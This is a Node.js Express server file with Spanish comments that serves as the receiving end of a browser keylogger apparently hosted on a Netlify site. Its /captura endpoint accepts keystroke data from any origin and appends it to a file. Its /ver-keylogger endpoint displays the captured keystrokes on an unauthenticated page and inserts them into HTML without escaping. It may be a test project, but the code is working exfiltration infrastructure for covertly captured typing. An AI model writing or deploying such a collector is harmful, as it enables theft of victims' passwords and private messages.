// Servidor simplificado y autocontenido para Render
const express = require('express');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

console.log('🚀 INICIANDO SERVIDOR BACKEND-PRUEBA');
console.log('🌍 Entorno:', process.env.NODE_ENV || 'development');
console.log('📦 Puerto:', PORT);

// Middleware
app.use(express.json());

// CORS para permitir requests desde Netlify
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Ruta de diagnóstico
app.get('/', (req, res) => {
  res.json({
    message: '✅ Backend funcionando correctamente',
    timestamp: new Date().toISOString(),
    server: 'backend-prueba',
    version: '2.0.0',
    endpoints: [
      'GET /',
      'GET /health',
      'GET /ver-keylogger',
      'POST /captura'
    ]
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'OK',
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    memory: process.memoryUsage(),
    env: process.env.NODE_ENV || 'development'
  });
});

// Endpoint para capturar datos
app.post('/captura', async (req, res) => {
  try {
    console.log('📥 Datos recibidos:', req.body);
    
    const data = JSON.stringify({
      ...req.body,
      timestamp: new Date().toISOString(),
      server: 'render'
    }) + '\n';
    
    // Guardar en archivo
    await fs.appendFile('./datos.txt', data);
    
    console.log('✅ Datos guardados correctamente');
    res.json({ 
      ok: true, 
      message: 'Datos guardados correctamente',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('❌ Error al guardar datos:', error);
    res.status(500).json({ 
      error: 'Error interno del servidor',
      message: error.message 
    });
  }
});

// Endpoint para ver datos capturados
app.get('/ver-keylogger', async (req, res) => {
  try {
    console.log('📖 Solicitando datos capturados');
    
    const data = await fs.readFile('./datos.txt', 'utf8');
    
    res.send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <title>Datos Capturados - Backend Prueba</title>
        <style>
          body { 
            font-family: Arial, sans-serif; 
            max-width: 1200px; 
            margin: 0 auto; 
            padding: 20px; 
            background-color: #f5f5f5;
          }
          .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          }
          pre { 
            background: #f8f9fa; 
            padding: 15px; 
            border-radius: 5px; 
            overflow-x: auto;
            border-left: 4px solid #007bff;
          }
          .header {
            color: #007bff;
            border-bottom: 2px solid #007bff;
            padding-bottom: 10px;
            margin-bottom: 20px;
          }
          .back-btn {
            display: inline-block;
            background: #007bff;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 20px;
          }
          .back-btn:hover {
            background: #0056b3;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🎹 Datos Capturados del Keylogger</h1>
            <p>Servidor: <strong>Render</strong> | Actualizado: ${new Date().toLocaleString()}</p>
          </div>
          <pre>${data}</pre>
          <a href="https://papadelta2.netlify.app/" class="back-btn">🏠 Volver al Frontend</a>
        </div>
      </body>
      </html>
    `);
  } catch (error) {
    if (error.code === 'ENOENT') {
      console.log('📝 No hay datos aún, mostrando mensaje por defecto');
      res.send(`
        <!DOCTYPE html>
        <html lang="es">
        <head>
          <meta charset="UTF-8">
          <title>Sin Datos - Backend Prueba</title>
          <style>
            body { 
              font-family: Arial, sans-serif; 
              max-width: 800px; 
              margin: 0 auto; 
              padding: 20px; 
              text-align: center;
              background-color: #f5f5f5;
            }
            .container {
              background: white;
              padding: 40px;
              border-radius: 10px;
              box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .emoji { font-size: 4em; margin-bottom: 20px; }
            .back-btn {
              display: inline-block;
              background: #007bff;
              color: white;
              padding: 12px 24px;
              text-decoration: none;
              border-radius: 5px;
              margin: 10px;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="emoji">📭</div>
            <h1>No hay datos capturados aún</h1>
            <p>Utiliza el keylogger para capturar algunas teclas primero.</p>
            <a href="https://papadelta2.netlify.app/" class="back-btn">🏠 Ir al Frontend</a>
            <a href="https://papadelta2.netlify.app/keylogger.html" class="back-btn">🎹 Ir al Keylogger</a>
          </div>
        </body>
        </html>
      `);
    } else {
      console.error('❌ Error al leer datos:', error);
      res.status(500).send(`
        <h1>Error del servidor</h1>
        <p>Error al leer los datos: ${error.message}</p>
        <a href="https://papadelta2.netlify.app/">Volver al inicio</a>
      `);
    }
  }
});

// Manejo de rutas no encontradas
app.use('*', (req, res) => {
  res.status(404).json({
    error: 'Ruta no encontrada',
    path: req.originalUrl,
    availableEndpoints: ['/', '/health', '/ver-keylogger', '/captura']
  });
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 ================================');
  console.log(`✅ SERVIDOR INICIADO CORRECTAMENTE`);
  console.log(`🌐 Puerto: ${PORT}`);
  console.log(`🕐 Hora: ${new Date().toISOString()}`);
  console.log(`🔗 Endpoints activos:`);
  console.log(`   GET  / (info del servidor)`);
  console.log(`   GET  /health (diagnóstico)`);
  console.log(`   GET  /ver-keylogger (datos)`);
  console.log(`   POST /captura (recibir datos)`);
  console.log('🚀 ================================');
});